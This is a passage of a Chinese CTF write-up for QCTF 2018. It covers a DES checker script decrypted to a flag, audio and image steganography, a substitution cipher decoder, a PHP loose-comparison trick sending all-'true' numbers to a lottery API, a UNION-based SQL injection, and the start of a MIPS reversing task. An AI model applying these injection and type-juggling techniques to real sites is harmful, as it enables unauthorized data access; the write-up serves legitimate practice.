<span class="number">6</span>],     </span><br><span class="line">     [<span class="number">1</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">2</span>],     </span><br><span class="line">     [<span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">1</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">7</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">3</span>, <span class="number">12</span>]],</span><br><span class="line"></span><br><span class="line">   [[<span class="number">13</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">9</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">12</span>,  <span class="number">7</span>],     </span><br><span class="line">     [<span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>,  <span class="number">2</span>],     </span><br><span class="line">     [<span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">8</span>],     </span><br><span class="line">     [<span class="number">2</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span>]]]</span><br><span class="line">     </span><br><span class="line">pc1=(<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,  <span class="number">9</span>,</span><br><span class="line">       <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">      <span class="number">10</span>,  <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">      <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">      <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">       <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">      <span class="number">14</span>,  <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">      <span class="number">21</span>, <span class="number">13</span>,  <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">pc2= (<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">3</span>, <span class="number">28</span>,</span><br><span class="line">      <span class="number">15</span>,  <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>,  <span class="number">4</span>, </span><br><span class="line">      <span class="number">26</span>,  <span class="number">8</span>, <span class="number">16</span>,  <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>,  <span class="number">2</span>, </span><br><span class="line">      <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>, </span><br><span class="line">      <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, </span><br><span class="line">      <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">d = (  <span class="number">1</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">2</span>,  <span class="number">2</span>,  <span class="number">2</span>,  <span class="number">2</span>,  <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">__all__=[<span class="string">'desencode'</span>]</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DES</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">code</span><span class="params">(self,from_code,key,code_len,key_len)</span>:</span></span><br><span class="line">		output=<span class="string">""</span></span><br><span class="line">		trun_len=<span class="number">0</span></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">		code_string=self._functionCharToA(from_code,code_len)</span><br><span class="line">		code_key=self._functionCharToA(key,key_len)</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> code_len%<span class="number">16</span>!=<span class="number">0</span>:</span><br><span class="line">			real_len=(code_len/<span class="number">16</span>)*<span class="number">16</span>+<span class="number">16</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			real_len=code_len</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> key_len%<span class="number">16</span>!=<span class="number">0</span>:</span><br><span class="line">			key_len=(key_len/<span class="number">16</span>)*<span class="number">16</span>+<span class="number">16</span></span><br><span class="line">		key_len*=<span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		trun_len=<span class="number">4</span>*real_len</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,trun_len,<span class="number">64</span>):</span><br><span class="line">			run_code=code_string[i:i+<span class="number">64</span>]</span><br><span class="line">			l=i%key_len</span><br><span class="line">			run_key=code_key[l:l+<span class="number">64</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			run_code= self._codefirstchange(run_code)</span><br><span class="line">			run_key= self._keyfirstchange(run_key)</span><br><span class="line">			</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">				</span><br><span class="line"></span><br><span class="line">				code_r=run_code[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line">				code_l=run_code[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">					</span><br><span class="line"></span><br><span class="line">				run_code=code_r</span><br><span class="line">				</span><br><span class="line"></span><br><span class="line">				code_r= self._functionE(code_r)</span><br><span class="line">				</span><br><span class="line"></span><br><span class="line">				key_l=run_key[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">				key_r=run_key[<span class="number">28</span>:<span class="number">56</span>]</span><br><span class="line">				key_l=key_l[d[j]:<span class="number">28</span>]+key_l[<span class="number">0</span>:d[j]]</span><br><span class="line">				key_r=key_r[d[j]:<span class="number">28</span>]+key_r[<span class="number">0</span>:d[j]]</span><br><span class="line">				run_key=key_l+key_r</span><br><span class="line">				key_y= self._functionKeySecondChange(run_key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">				code_r= self._codeyihuo(code_r,key_y)</span><br><span class="line">				</span><br><span class="line"></span><br><span class="line">				code_r= self._functionS(code_r)</span><br><span class="line">				</span><br><span class="line"></span><br><span class="line">				code_r= self._functionP(code_r)</span><br><span class="line">				</span><br><span class="line"></span><br><span class="line">				code_r= self._codeyihuo(code_l,code_r)</span><br><span class="line">				run_code+=code_r</span><br><span class="line"></span><br><span class="line">			code_r=run_code[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line">			code_l=run_code[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">			run_code=code_r+code_l</span><br><span class="line">			</span><br><span class="line"></span><br><span class="line">			output+=self._functionCodeChange(run_code)</span><br><span class="line">		<span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_codeyihuo</span><span class="params">(self,code,key)</span>:</span></span><br><span class="line">		code_len=len(key)</span><br><span class="line">		return_list=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(code_len):</span><br><span class="line">			<span class="keyword">if</span> code[i]==key[i]:</span><br><span class="line">				return_list+=<span class="string">'0'</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				return_list+=<span class="string">'1'</span></span><br><span class="line">		<span class="keyword">return</span> return_list</span><br><span class="line"></span><br><span class="line">	 		 							</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_codefirstchange</span><span class="params">(self,code)</span>:</span></span><br><span class="line">		changed_code=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">			changed_code+=code[ip[i]<span class="number">-1</span>]</span><br><span class="line">		<span class="keyword">return</span> changed_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_keyfirstchange</span> <span class="params">(self,key)</span>:</span></span><br><span class="line">		changed_key=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">56</span>):</span><br><span class="line">			changed_key+=key[pc1[i]<span class="number">-1</span>]</span><br><span class="line">		<span class="keyword">return</span> changed_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_functionCodeChange</span><span class="params">(self, code)</span>:</span></span><br><span class="line">		lens=len(code)/<span class="number">4</span></span><br><span class="line">		return_list=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(lens):</span><br><span class="line">			list=<span class="string">''</span></span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">				list+=code[ip_1[i*<span class="number">4</span>+j]<span class="number">-1</span>]</span><br><span class="line">			return_list+=<span class="string">"%x"</span> %int(list,<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">return</span> return_list</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_functionE</span><span class="params">(self,code)</span>:</span></span><br><span class="line">		return_list=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">			return_list+=code[e[i]<span class="number">-1</span>]</span><br><span class="line">		<span class="keyword">return</span> return_list		</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_functionP</span><span class="params">(self,code)</span>:</span></span><br><span class="line">		return_list=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">			return_list+=code[p[i]<span class="number">-1</span>]</span><br><span class="line">		<span class="keyword">return</span> return_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_functionS</span><span class="params">(self, key)</span>:</span></span><br><span class="line">		return_list=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">			row=int( str(key[i*<span class="number">6</span>])+str(key[i*<span class="number">6</span>+<span class="number">5</span>]),<span class="number">2</span>)</span><br><span class="line">			raw=int(str( key[i*<span class="number">6</span>+<span class="number">1</span>])+str(key[i*<span class="number">6</span>+<span class="number">2</span>])+str(key[i*<span class="number">6</span>+<span class="number">3</span>])+str(key[i*<span class="number">6</span>+<span class="number">4</span>]),<span class="number">2</span>)</span><br><span class="line">			return_list+=self._functionTos(s[i][row][raw],<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> return_list</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_functionKeySecondChange</span><span class="params">(self,key)</span>:</span></span><br><span class="line">		return_list=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">			return_list+=key[pc2[i]<span class="number">-1</span>]</span><br><span class="line">		<span class="keyword">return</span> return_list</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_functionCharToA</span><span class="params">(self,code,lens)</span>:</span></span><br><span class="line">		return_code=<span class="string">''</span></span><br><span class="line">		lens=lens%<span class="number">16</span></span><br><span class="line">		<span class="keyword">for</span> key <span class="keyword">in</span> code:</span><br><span class="line">			code_ord=int(key,<span class="number">16</span>)</span><br><span class="line">			return_code+=self._functionTos(code_ord,<span class="number">4</span>)		</span><br><span class="line">		<span class="keyword">if</span> lens!=<span class="number">0</span>:</span><br><span class="line">			return_code+=<span class="string">'0'</span>*(<span class="number">16</span>-lens)*<span class="number">4</span></span><br><span class="line">		<span class="keyword">return</span> return_code</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_functionTos</span><span class="params">(self,o,lens)</span>:</span></span><br><span class="line">		return_code=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(lens):</span><br><span class="line">			return_code=str(o&gt;&gt;i &amp;<span class="number">1</span>)+return_code</span><br><span class="line">		<span class="keyword">return</span> return_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tohex</span><span class="params">(string)</span>:</span></span><br><span class="line">	return_string=<span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">		return_string+=<span class="string">"%02x"</span>%ord(i)</span><br><span class="line">	<span class="keyword">return</span> return_string</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tounicode</span><span class="params">(string)</span>:</span></span><br><span class="line">	return_string=<span class="string">''</span></span><br><span class="line">	string_len=len(string)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,string_len,<span class="number">2</span>):</span><br><span class="line">		return_string+=chr(int(string[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">	<span class="keyword">return</span> return_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">desencode</span><span class="params">(from_code,key)</span>:</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	from_code=tohex(from_code)</span><br><span class="line">	key=tohex(key)</span><br><span class="line">	</span><br><span class="line">	des=DES()</span><br><span class="line">	key_len=len(key)</span><br><span class="line">	string_len=len(from_code)		</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">if</span> string_len&lt;<span class="number">1</span> <span class="keyword">or</span> key_len&lt;<span class="number">1</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'error input'</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">	key_code= des.code(from_code,key,string_len,key_len)</span><br><span class="line">	<span class="keyword">return</span> key_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__  == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">if</span>(desencode(sys.argv[<span class="number">1</span>],<span class="string">'mtqVwD4JNRjw3bkT9sQ0RYcZaKShU4sf'</span>)==<span class="string">'e3fab29a43a70ca72162a132df6ab532535278834e11e6706c61a1a7cefc402c8ecaf601d00eee72'</span>):</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'correct.'</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'try again.'</span></span><br></pre></td></tr></table></figure>
<p>解出来之后发现应该是DES，但无从下手。后来看了<a href="https://ihomura.cn/2018/07/25/WriteUp-QCTF-keyword-picture/" target="_blank" rel="noopener">孔师傅的wp</a>，一惊居然还有这种骚操作。</p>
<p>顺便记录一下<code>__all__</code>在python中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The only solution is for the package author to provide an explicit index of the package. The import statement uses the following convention: if a package’s init.py code defines a list named all, it is taken to be the list of module names that should be imported when from package import * is encountered. It is up to the package author to keep this list up-to-date when a new version of the package is released. Package authors may also decide not to support it, if they don’t see a use for importing * from their package.</span><br></pre></td></tr></table></figure>
<p>最后用<a href="https://github.com/liupengs/DES_Python/blob/master/des.py" target="_blank" rel="noopener">搜到的脚本</a>解密：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python des_1.py </span></span><br><span class="line">DES 解密</span><br><span class="line"></span><br><span class="line">请输入密文（长度不限）:e3fab29a43a70ca72162a132df6ab532535278834e11e6706c61a1a7cefc402c8ecaf601d00eee72</span><br><span class="line">请输入密钥（长度不限）:mtqVwD4JNRjw3bkT9sQ0RYcZaKShU4sf</span><br><span class="line">QCTF&#123;eCy0AALMDH9rLoBnWnTigXpYPkgU0sU4&#125;</span><br><span class="line">按确定退出</span><br></pre></td></tr></table></figure>
<h2 id="Noise"><a href="#Noise" class="headerlink" title="Noise"></a>Noise</h2><p>拿到一个<code>Noise.wav</code>，发现是<code>my little pony theme song</code>。尝试用<code>mp3stego</code>后无果。再反复听了很多次，发现有一些噪音夹杂在里面。</p>
<p>看一下hint，个人认为这里最关键的是hint2，需要了解通过消除伴奏获得人声的原理。</p>
<p><img src="/pics/2018-QCTF-writeup/1.png" alt="hint"></p>
<p>关于原理，利用声波叠加干涉消除原声，当声波的相位差达到180度的时候，就可以达到消音的效果：</p>
<p><img src="/pics/2018-QCTF-writeup/2.png" alt="消声的原理"></p>
<p>跟着<a href="https://www.bilibili.com/video/av560712?spm_id_from=333.338.__bofqi.15" target="_blank" rel="noopener">教程</a>学会怎么使用<code>Adobe Audition</code>，使声波相位差达到180度。</p>
<p>要提取出噪音，我们要做的就是从网上下载原版的<code>my little pony theme song</code>，然后将<code>Noise.wav</code>和它的相位差调整为180度，就可以提取出噪音。</p>
<p><img src="/pics/2018-QCTF-writeup/3.png" alt="调整相位差"></p>
<p>关于这段噪音的话，和<strong>慢扫描电视</strong>有关。利用软件<code>MMSSTV</code>，最后得到flag。</p>
<p><img src="/pics/2018-QCTF-writeup/4.png" alt="得到flag"></p>
<h2 id="X-man-Keyword"><a href="#X-man-Keyword" class="headerlink" title="X-man-Keyword"></a>X-man-Keyword</h2><p>也是lsb。</p>
<p><img src="/pics/2018-QCTF-writeup/5.png" alt="图片最上方能看出"></p>
<p>密码为图片中的<code>lovekfc</code>。</p>
<p><img src="/pics/2018-QCTF-writeup/6.png" alt="解出密文"></p>
<p>通过提示，将<code>LOVEKFC</code>作为关键字提到最前面，和正常顺序的英文字母进行置换。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PVSF&#123;vVckHejqBOVX9C1c13GFfkHJrjIQeMwf&#125;</span><br><span class="line"></span><br><span class="line">LOVEKFCABDGHIJMNPQRSTUWXYZ</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line"></span><br><span class="line">QCTF...</span><br><span class="line">// 容易发现前四位正好是QCTF</span><br></pre></td></tr></table></figure>
<p>写一下脚本跑出结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s1[<span class="number">27</span>] = <span class="string">"lovekfcabdghijmnpqrstuwxyz"</span>;</span><br><span class="line">    <span class="keyword">char</span> s2[<span class="number">27</span>] = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>;</span><br><span class="line">    <span class="keyword">char</span> s3[<span class="number">27</span>] = <span class="string">"LOVEKFCABDGHIJMNPQRSTUWXYZ"</span>;</span><br><span class="line">    <span class="keyword">char</span> s4[<span class="number">27</span>] = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    <span class="keyword">char</span> ans[<span class="number">39</span>] = <span class="string">"PVSF&#123;vVckHejqBOVX9C1c13GFfkHJrjIQeMwf&#125;"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(ans); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">islower</span>(ans[i])) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(s1); j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(ans[i] == s1[j]) &#123;</span><br><span class="line">                    ans[i] = s2[j];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isupper</span>(ans[i])) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(s3); j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(ans[i] == s3[j]) &#123;</span><br><span class="line">                    ans[i] = s4[j];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/pics/2018-QCTF-writeup/7.png" alt="得到flag"></p>
<h2 id="X-man-A-face"><a href="#X-man-A-face" class="headerlink" title="X-man-A face"></a>X-man-A face</h2><p>补全二维码定位符，扫出一串类似base64的密文。</p>
<p><img src="/pics/2018-QCTF-writeup/8.png" alt="补全后扫码"></p>
<p>经过尝试，通过base32解码得到flag。</p>
<p><img src="/pics/2018-QCTF-writeup/9.png" alt="得到flag"></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery"></a>Lottery</h2><p>通过GitHack拿到源码，在api.php中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span><span class="params">($req)</span></span>&#123;</span><br><span class="line">	require_registered();</span><br><span class="line">	require_min_money(<span class="number">2</span>);</span><br><span class="line">	$money = $_SESSION[<span class="string">'money'</span>];</span><br><span class="line">	$numbers = $req[<span class="string">'numbers'</span>];</span><br><span class="line">	$win_numbers = random_win_nums();</span><br><span class="line">	$same_count = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;<span class="number">7</span>; $i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">			$same_count++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><code>$numbers</code>即用户输入的数字，<code>$win_numbers</code>即随机生成的数字。根据PHP弱类型比较，例如<code>TRUE</code>和<code>1</code>和<code>&quot;1&quot;</code>相等，构造<code>&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]</code>即可中最高奖，得到flag。</p>
<h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p>直接用联合注入判断出列数为三列后，就开始走流程emmm。</p>
<p><img src="/pics/2018-QCTF-writeup/10.png" alt="得到库名"></p>
<p><img src="/pics/2018-QCTF-writeup/11.png" alt="得到表名"></p>
<p>显而易见flag应该在<code>secret_table</code>中。</p>
<p><img src="/pics/2018-QCTF-writeup/12.png" alt="获取列名"></p>
<p>在<code>fl4g</code>列中得到flag：</p>
<p><img src="/pics/2018-QCTF-writeup/13.png" alt="得到flag"></p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Xman-babymips"><a href="#Xman-babymips" class="headerlink" title="Xman-babymips"></a>Xman-babymips</h2><p>mips逆向，看一下<a href="https://bestwing.me/mips-decompiler-retdec-install-guide.html" target="_blank" rel="noopener">swing的博客</a>，安装一波retdec来反编译。</p>
<p>反编译出几个关键函数：</p>
<ul>
<li>check函数：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span 